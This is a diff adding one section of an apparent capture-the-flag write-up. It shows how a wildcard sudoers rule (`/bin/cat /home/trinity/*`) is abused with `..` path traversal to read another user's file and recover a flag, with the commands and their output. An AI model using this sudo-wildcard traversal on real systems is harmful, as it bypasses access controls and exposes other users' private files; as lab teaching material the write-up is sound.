@@ -192,3 +192,50 @@ FLAG-54e7f8d0ea560fa7ed98e832900fc45b
 ```
 
 ## SysAdmin Part 6
+
+![](https://i.imgur.com/kpmb3B4.png)
+
+Now we have to login as `trinity:Flag-7e0cfcf090a2fe53c97ea3edd3883d0d` and search for neo password!
+
+If we run `sudo -l` we can see that we can run as neo the `/bin/cat /home/trinity/*`:
+
+```
+trinity@lxc-sysadmin:~$ sudo -l
+[sudo] password for trinity:
+Matching Defaults entries for trinity on lxc-sysadmin:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User trinity may run the following commands on lxc-sysadmin:
+    (neo) /bin/cat /home/trinity/*
+```
+
+We can see a copy of neo's phonebook:
+
+```
+trinity@lxc-sysadmin:~$ sudo -u neo /bin/cat /home/trinity/*
+The Oracle        1800-133-7133
+Persephone        345-555-1244
+
+
+
+
+
+copy made by Cypher copy utility on /home/neo/phonebook
+```
+
+So we can do a trick here and use `..` to move to parent directory and read all phonebook:
+
+```
+trinity@lxc-sysadmin:~$ sudo -u neo /bin/cat /home/trinity/../neo/phonebook
+The Oracle        1800-133-7133
+Persephone        345-555-1244
+
+
+
+
+change my current password FLAG-314df4d411ae37f16f590f65da99f3b6
+```
+
+We have the flag! `FLAG-314df4d411ae37f16f590f65da99f3b6`
+
+## SysAdmin Part 7
